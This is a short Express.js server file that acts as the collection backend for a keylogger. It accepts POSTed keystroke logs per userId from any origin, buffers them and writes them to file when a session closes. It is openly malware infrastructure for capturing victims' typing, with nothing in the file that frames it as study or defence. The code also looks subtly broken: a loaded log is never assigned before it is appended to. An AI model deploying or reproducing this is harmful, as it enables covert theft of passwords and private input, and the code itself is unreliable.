import e from "express";
import CORS from "cors";
import { loadFromFile, saveToFile } from "./controllers/keylogger";

let app = e();

let data = {};

app.use(CORS());
app.use(e.json());
app.post("/", (req, res) => {
  let { userId, keylog, type } = req.body;
  if (!userId) return;
  if (!data[userId]) loadFromFile(userId);
  if (keylog) data[userId].push(keylog);

  if (type && type === "close") saveToFile(userId, data[userId]);
  res.json({ msg: "sent successfully" });
});

app.listen(3000, "0.0.0.0", () => {
  console.log("Server is running in http://localhost:3000");
});
